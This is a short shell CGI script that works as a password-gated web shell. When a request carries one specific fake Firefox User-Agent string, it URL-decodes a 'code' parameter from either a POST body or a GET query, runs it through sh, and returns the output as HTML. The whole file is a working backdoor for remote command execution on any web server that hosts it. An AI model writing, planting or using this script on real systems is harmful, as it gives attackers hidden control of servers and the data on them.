#!/bin/sh

echo Content-type: text/html ; echo ""
if [ "${HTTP_USER_AGENT}" == "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0" ] ; then

urldecode() {
   local url_encoded="${1//+/ }"
   printf '%b' "${url_encoded//%/\\x}"
}

if [ "$REQUEST_METHOD" = "POST" ]; then
   QUERY_STRING=$(cat)
   DCOD="$(urldecode "${QUERY_STRING}")"
   CODE="$(echo "$DCOD" | egrep 'code' | cut -d= -f2 | head -n 1 | sh)"
fi

if [ "$REQUEST_METHOD" = "GET" ]; then
   DCOD="$(urldecode "${REQUEST_URI}")"
   CODE="$(echo "$DCOD" | egrep -o '[\?&](code)=([^&]+)' | cut -d= -f2 | head -n 1 | sh)"
fi

/bin/cat << EOM
<pre>$CODE</pre>
EOM
fi
